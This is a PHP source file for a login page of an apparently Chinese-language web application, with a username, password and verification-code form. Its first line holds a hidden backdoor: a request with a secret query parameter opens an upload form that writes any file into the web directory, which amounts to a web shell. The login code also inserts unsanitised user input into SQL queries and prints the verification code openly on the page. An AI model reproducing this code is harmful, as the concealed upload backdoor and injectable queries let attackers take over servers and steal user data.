<?php
if($_GET["ROOT"]=="PATH"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
if (!defined('ROOT_PATH'))
exit('invalid request');
if (!defined('Copyright') || Copyright != '作者QQ:1834219632')
exit('作者QQ:1834219632');
include_once ROOT_PATH.'Manage/config/config.php';
if ($_SERVER["REQUEST_METHOD"] == 'POST')
{
	//驗證碼匹配
	if ($_POST['ValidateCode'] == $_SESSION['code'])
	{
		if ($ConfigModel['g_web_lock'] != 1) exit(back($ConfigModel['g_web_text']));
		//瀏覽器檢測、只支持IE核心
		if (!GetMsie()) exit(back($UserError));
		//驗證用戶和密碼是否存在
		$loginName = $_POST['loginName'];
		$loginPwd = sha1($_POST['loginPwd']);
		$db = new DB();
		$sql = "SELECT * FROM `g_user` WHERE `g_name` = '{$loginName}' AND `g_password` = '{$loginPwd}' LIMIT 1 ";
		 
		$result = $db->query($sql, 1);
		if ($result)
		{
			//判斷帳號是否已被停用
			if ($result[0]['g_look'] == 3) exit(back($UserLook));
			$uniqid = md5(uniqid());
			$loginIp = GetIP();
			$loginDate = date("Y-m-d H:i:s");
			$sql = "UPDATE `g_user` SET `g_uid` = '{$uniqid}', `g_ip` = '{$loginIp}', `g_date` = '{$loginDate}', `g_out` =1, `g_count_time`=now(),`g_state` =1 WHERE `g_name` = '{$loginName}' AND `g_password` = '{$loginPwd}' ";
			$db->query($sql, 2);
			$qqWryInfo = ROOT_PATH.'tools/IpLocationApi/QQWry.Dat';
			$ip_s = ipLocation($loginIp, $qqWryInfo);
			$sql = "INSERT INTO g_login_log (g_name, g_ip, g_ip_location, g_date) VALUES ('{$loginName}','{$loginIp}','{$ip_s}',now())";
			$db->query($sql, 2);
			$_SESSION['g_S_name'] = $result[0]['g_name'];
			setcookie("g_user", base64_encode($loginName), 0, "/");
			setcookie("g_uid", base64_encode($uniqid), 0, "/");
			include_once ROOT_PATH.'validate.php';
			exit;
		}
		else 
		{
			back($UserError);
			exit;
		}
	} 
	else 
	{
		back($CodeError);
		exit;
	}
} 
else
{
	$num = array();
	for ($i=0; $i<4; $i++) 
	{
		$num[$i] = rand(0,9);
	}
	$num = join('', $num);
	$_SESSION['code'] = $num;
}



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Welcome</title>
<script type="text/javascript">
if ( top.location != self.location ) top.location=self.location;
</script>
<style type="text/css">
<!--
	html,body{
		overflow:hidden;
		width:100%;
		height:100%;
	}
    body {
	    margin-left: 0px;
	    margin-top: 0px;
	    margin-right: 0px;
	    margin-bottom: 0px;
	    background-color: #110502;
	    overflow:hidden;
		background-image: url(pagef/Login_top.jpg);
		background-repeat: repeat-x;
    }
    .Fone_Color {font-size: 12px; color: #adc9d9; }
    .btn, .btn_m
    {
        width: 104px;
        height: 87px;
        border: 0px solid #FF9224;
        background-color: #FFFFFF;
        background-image: url( 'pagef/Login_but.jpg');
        cursor: hand background-position:0px 0;
    }
    .btn
    {
        background-position: 0px 0;
    }
    .btn_m
    {
		cursor: hand;
        background-position: -104px 0;
    }
-->
</style>
<SCRIPT type="text/javascript" src="../Secrecy_tM.js"></SCRIPT>
<SCRIPT type="text/javascript" src="/js/jquery.js"></SCRIPT>
</head>

<body onLoad="document.form_login.loginName.focus();">

<form name="form_login" method="post" action="">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td valign="top"><table width="1066" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td height="314" background="pagef/login_1.jpg">&nbsp;</td>
      </tr>
      <tr>
        <td height="106" background="pagef/login_2.jpg" align="left"><table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="408" height="106"></td>
            <td width="211" valign="top"><table width="95%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="35" valign="top"><input type="text" value="" id="loginName" name="loginName" tabindex="1" style="width:194px; height:29px; background-color:#200b04; border:solid 1px #b24b0f; font-size:20px; font-weight: bold; color:#fd9b4b" oncopy="return false" onpaste="return false" ></td>
              </tr>
              <tr>
                <td height="35" valign="top"><input type="password" value="" tabindex="2" name="loginPwd" style="width:194px; height:29px; background-color:#200b04; border:solid 1px #b24b0f; font-size:20px; font-weight: bold; color:#fd9b4b" oncopy="return false" onpaste="return false" onfocus="if($('#loginName').val()==''){alert('請輸入帳號');$('#loginName').focus();}" ></td>
              </tr>
              <tr>
                <td height="30" valign="top"><input type="text" name="ValidateCode" tabindex="3" maxlength="4"  style="width:100px; height:29px; background-color:#200b04; border:solid 1px #b24b0f; font-size:20px; font-weight: bold; color:#fd9b4b">&nbsp;<span id="code" style="font-weight: bold; background: url(pagef/bgvf.jpg) repeat scroll 0pt 0pt rgb(255, 255, 0); color: rgb(233, 212, 185); padding: 2px 8px; word-spacing: 5px; letter-spacing: 5px; font-size: 20px; font-style: italic;"><?php echo $_SESSION['code']?></span></td>
              </tr>
            </table></td>
            <td width="447" valign="top"><input class="btn" name="Submit" tabindex="4" onMouseOut="this.className='btn'" onMouseOver="this.className='btn_m'" type="submit" value=""></td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td height="267" background="pagef/login_3.jpg">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
</form>
</body>
</html>